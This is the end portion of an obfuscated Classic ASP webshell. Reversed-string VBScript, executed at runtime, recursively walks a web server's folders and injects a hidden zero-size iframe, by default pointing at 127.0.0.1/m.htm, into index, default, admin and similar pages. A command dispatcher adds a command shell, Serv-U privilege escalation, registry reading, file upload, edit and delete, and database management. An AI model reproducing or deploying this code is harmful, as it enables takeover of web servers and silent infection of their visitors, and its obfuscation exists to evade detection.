ShiSan="fi dne~)elifcp,edocdda,htapF(seliFllAtresnI llac~��>RT/<>DT/<������>retnec=ngila '%03'=htdiw daeHBT=ssalc  DT<>DT/<��·�Ծ�����>daeHBT=ssalc  DT<>DT/<����>retnec=ngila daeHBT=ssalc  DT<>RT<>d07d19#=roloCgb 1=gnicapsllec 3=gniddapllec retnec=ngila 0=redrob %08=htdiw ELBAT<�� SRR~ neht ����ִʼ����=)��timbus��(tseuqer fi~ ��>mrof/<>elbat/<�� SRR	~��>rt/<>dt/<]>tnof/<��>der=roloc tnof<������ �� �������� �� �̣�����[--�ͽ�Ǳ�-- >��ִʼ��=eulav timbus=epyt timbus=eman tupni< >DTBT=ssalc dt<>dt/<>DTBT=ssalc dt<>rt<�� SRR	~��>rt/<>dt/<>aeratxet/<��&2edocdda&��>3=swor 66=sloc 2edoc=eman aeratxet<>DTBT=ssalc  dt<>dt/<��Ϊ �� ��>DTBT=ssalc dt<>rt<�� SRR neht ��3��=M fi	~��>rt/<>dt/<>aeratxet/<��&edocdda&��>3=swor 66=sloc edoc=eman aeratxet<>DTBT=ssalc dt<>dt/<>tnof/<��SRR	~���������Ҳ隢SRR neht ��3��=M fi	~���������Ҫ��SRR neht ��2��=M fi	~������Ĺ�Ҫ��SRR neht ��1��=M fi	~��>DTBT=ssalc dt<>rt<>rt/<>dt/<]��չ��[������ĵĸ���Ҫ���� >04=ezis '��&epytF&��'=eulav 'epyTF'=di txet=epyt 'epyTF'=eman tupni<>DTBT=ssalc dt<�� SRR	~��>dt/<���������>DTBT=ssalc dt<>rt<�� SRR	~��>rt/<>dt/<psa.3|psa.2|psa.1������>04=ezis '��&elifcp&��'=eulav 'elifcp'=di txet=epyt 'elifcp'=eman tupni<>DTBT=ssalc dt<�� SRR	~��>dt/<�����ĳ���>DTBT=ssalc  dt<>rt<�� SRR	~��>rt/<>dt/<]��չ������[�����Ĺ�Ҫ��д��>04=ezis '��&elifz&��'=eulav 'elifz'=di txet=epyt 'elifz'=eman tupni<>DTBT=ssalc dt<>dt/<�����Ķ�ָ>DTBT=ssalc dt<>rt<>rt/<>dt/<����ĸ��ظ���������ҳ��һֹ�� >��&xobkcehc&�� ����dekcehc����=eulav xobkcehc=epyt 'dekcehc'=dekcehc 'xobkcehc'=eman c=ssalc tupni<>DTBT=ssalc dt<>dt/<�������˹�>DTBT=ssalc dt<>rt<�� SRR neht ��4��=M fi	~��>rt/<>dt/<����ĸ��ظ���������ҳ��һֹ�� >��&xobkcehc&�� ����dekcehc����=eulav xobkcehc=epyt 'dekcehc'=dekcehc 'xobkcehc'=eman c=ssalc tupni<>DTBT=ssalc dt<>dt/<�������˹�>DTBT=ssalc dt<>rt<�� SRR neht ��1��=M fi	~��>rt/<>dt/<>tnof/<�����˳���%001������������������ֹ����Ϊ�����ĸ�һÿ��д�����α������ʱ�����д> der=roloc  tnof<>��&1xobkcehc&�� ����1dekcehc����=eulav xobkcehc=epyt '1xobkcehc'=dekcehc  '1xobkcehc'=eman c=ssalc tupni<>DTBT=ssalc dt<>dt/<������α����>DTBT=ssalc dt<>rt<�� SRR	~��>rt/<>dt/< >tnof/<)���ж���(¼Ŀд�ɴ����Ǿ�·��:��ע>==> der=roloc  tnof<>04=ezis '��&htapF&��'=eulav df=eman txet=epyt tupni<>DTBT=ssalc dt<�� SRR	~��>dt/<����·����>'%02'=htdiw DTBT=ssalc dt<>rt<>rt/<>dt/<��&)��.��(htaPpaM.revreS&��>DTBT=ssalc dt<>dt/<����.��¼Ŀ��̱�> DTBT=ssalc dt<>rt<>rt/<>dt/<��&)��/��(htaPpaM.revreS&��>DTBT=ssalc dt<>dt/<����\��¼Ŀ��վ��> DTBT=ssalc dt<>rt<>RT/<>DT/<>B/<>tnof/<��&TB&��>2222ff#=roloc TNOF<>B<>daeHBT=ssalc 2=napsloc DT<>RT<>d07d19#=roloCgb 1=gnicapsllec 3=gniddapllec retnec=ngila 0=redrob %08=htdiw ELBAT<>TSOP=dohtem mrof<�� SRR~����Ҷ�ָ��=TB neht ��4��=M fi	~���߹����޻������-������������=TB neht ��3��=M fi	~���������˱����-������������=TB neht ��2��=M fi	~���������-�����������=TB neht ��1��=M fi    ~fi dne	~ )nelifcp(kelifcp=elifcp		~ )kelifcp(dnuobu=nelifcp		~ )��/��,emaNelifcp(tilps=kelifcp		~)��EMAN_TPIRCS��(selbairaVrevreS.tseuqeR=emaNelifcp		~neht ����=elifcp fi	~)��1xobkcehc��(tseuqer=1xobkcehc neht ����=1xobkcehc fi	~)��xobkcehc��(tseuqer=xobkcehc neht ����=xobkcehc fi	~��>emarfi/<>0=thgieh 0=htdiw mth.m/1.0.0.721//:ptth=crs emarfi<��=edocdda neht ����=edocdda fi	~rid=htapF neht ����=htapF ro ��.��=htapF fi	~)��\��(htaPpaM.revreS=htapF neht ��\��=htapF fi	~��xdc|asa|rec|igc|xpsa|psj|php|psa|lmth|mth��=epytF neht ����=epytF fi	~��mm|qq|piv|niam|ger|nimda|nnoc|xedni|tluafed��=elifz neht ����=elifz fi	~txen~fi dne~rof tixe	~ eurT,emanelif eliFeteleD.OSF	~esolc.RF	~esle~neht )emanelif(stsixEeliF.OSF TON FI~)eurt,emanelif(eliFtxeTetaerC.OSF = RF TES~)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS=OSF TES~txeN emuseR rorrE nO~��txt.rid��&rid=emanelif~��\��&)i(d&rid=rid~)��\��,)��.��(htappam.revres(tilps=d~))��\��,)��.��(htappam.revres(tilps(dnuobu ot 0 =i rof~   ~)��M��(tseuqer=M	~)��elifz��(tseuqer=elifz	~)��epyTF��(tseuqer=epyTF	~)��gsMwohS��(tseuqer=gsMwohS	~)��1xobkcehc��(tseuqer=1xobkcehc	~)��xobkcehc��(tseuqer=xobkcehc	~)��elifcp��(tseuqer=elifcp	~)��2edoc��(tseuqeR = 2edocdda	~)��edoc��(tseuqeR = edocdda	~)��df��(tseuqeR=htapF	":ExeCuTe(UZSS(ShiSan))
Sub InsertAllFiles(Wpath,Wcode,pc):ShiSan="gnihtoN = OSFW teS~gnihton=2elift tes~gnihton=elift tes~gnihtoN = OSF teS~gnihton=elift tes~txeN ~cp,edocW,htaPweN seliFllAtresnI	 ~eman.1f&����&htapW=htaPweN	~srelofbusf ni 1f hcaE roF ~sredloFbuS.f = srelofbusf teS ~txeN 	~��>rb<>a/<evoM>'����'=eltit 'ma'=ssalc ')����eliFevoM����,������&)��\\��,��\��,eman.elifym&htapW(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR~�� >a/<ypoC>'�Ƹ�'=eltit 'ma'=ssalc ')����eliFypoC����,������&)��\\��,��\��,eman.elifym&htapW(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR~�� >a/<leD>'��ɾ'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno  ')����eliFleD����,������&)��\\��,��\��,1rts(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR~�� >a/<tide>'����'=eltit 'ma'=ssalc ')����eliFtidE����,������&)��\\��,��\��,eman.elifym&htapW(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR~�� >a/<nwoD>'����'=eltit 'ma'=ssalc ')����eliFnwoD����,������&)��\\��,��\��,eman.elifym&htapW(ecalper&������(mroFlluF:tpircsavaj'=ferh a< �� �� SRR~fi dne		~eman.elifym&htapW&�� ����SRR			~esle		~tceles dne			~dne.esnopser:��.���߸�����û?������ܵ���?��������㚢SRR					~esle esac				~gnihtoN=eliFtnuoCjbo teS					~eman.elifym&htapW&��  �̚�SRR					~esolC.eliFtnuoCjbo					~edoCweN etirW.eliFtnuoCjbo					~)eurT,eman.elifym&htapW(eliFtxeTetaerC.OSFW=eliFtnuoCjbo teS					~)2edoCdda,edocW,lladaer.1elift(ecalpeR=edoCweN					~)2-,1,eman.elifym&����&htapW(eliftxetnepo.1SF=1elift teS					~��3�� esac				~gnihtoN=eliFtnuoCjbo teS					~eman.elifym&htapW&��  �̚�SRR					~esolC.eliFtnuoCjbo					~edoCweN etirW.eliFtnuoCjbo					~)eurT,eman.elifym&htapW(eliFtxeTetaerC.OSFW=eliFtnuoCjbo teS					~)����,edocW,lladaer.1elift(ecalpeR=edoCweN					~)2-,1,eman.elifym&����&htapW(eliftxetnepo.1SF=1elift teS					~��2�� esac				~fi dne					~gnihtoN=1elift teS						~fi dne						~esolc.1elift							~eman.elifym&htapW&�� >tnof/<��>der=roloc tnof<��SRR							~esle						~esolc.1elift							~eman.elifym&htapW&��  �̚�SRR							~edocW eniletirw.elift							~)2-,8,eman.elifym&����&htapW(eliftxetnepo.1SF=elift teS							~neht 0=)edocW,lladaer.1elift(rtsnI fi						~)2-,1,eman.elifym&����&htapW(eliftxetnepo.1SF=1elift teS						~esle					~esolc.elift						~eman.elifym&htapW&�� �̚�SRR						~edocW eniletirw.elift						~)2-,8,eman.elifym&����&htapW(eliftxetnepo.1SF=elift teS						~neht ��dekcehc��><xobkcehc fi					~��1�� esac				~M esac tceles			~neht 0><)3epyTF,)epyTF(esaCL(rtsnI dna 0=))eman.elifym(esaCL,)cp(esaCL(rtsnI fi		~fi dne		~���ޚ�=3epyTF		~esle		~ ))2epyTF(1epyTF(esaCL=3epyTF		~neht 0>2epytF fi		~ )1epyTF(dnuobu=2epyTF		~ )��.��,eman.elifym(tilps=1epyTF		~)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC = 1SF teS		~2cf ni elifym hcaE roF 	~selif.f = 2cf teS 	~)htapW(redloFteG.OSFW = f teS 	~ txen emuser rorre no 	~)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC = OSFW teS 	~��\��& htapW=htapW neht ��\��><)1,htapW(thgir fi 	~999999999=tuoemiTtpircS.revreS	":ExeCuTe(UZSS(ShiSan)):End Sub
Case "ReadREG"
call ReadREG()
Case "Show1File"
Set ABC=New LBF
ABC.Show1File(Session("FolderPath"))
Set ABC=Nothing:Case "DownFile"
DownFile FName:ShowErr()
Case "DelFile"
Set ABC=New LBF
ABC.DelFile(FName)
Set ABC=Nothing
Case "EditFile"
Set ABC=New LBF
ABC.EditFile(FName)
Set ABC=Nothing
Case "CopyFile"
Set ABC=New LBF
ABC.CopyFile(FName)
Set ABC=Nothing
Case "MoveFile"
Set ABC=New LBF
ABC.MoveFile(FName)
Set ABC=Nothing
Case "DelFolder"
Set ABC=New LBF
ABC.DelFolder(FName)
Set ABC=Nothing
Case "CopyFolder"
Set ABC=New LBF
ABC.CopyFolder(FName)
Set ABC=Nothing
Case "MoveFolder"
Set ABC=New LBF
ABC.MoveFolder(FName)
Set ABC=Nothing
Case "NewFolder"
Set ABC=New LBF
ABC.NewFolder(FName)
Set ABC=Nothing
Case "UpFile"
UpFile()
Case "suftp"
suftp()
Case "adminab"
adminab()
Case "Cmd1Shell"
Cmd1Shell()
Case "Logout"
Session.Contents.Remove("web2a2dmin")
Response.Redirect URL
Case "CreateMdb"
CreateMdb FName
Case "CompactMdb"
CompactMdb FName
Case "DbManager"
DbManager()
Case "Course"
Course()
Case "upload":upload()
Case "ServerInfo"
ServerInfo()
Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
RRS"</body></html>"

%>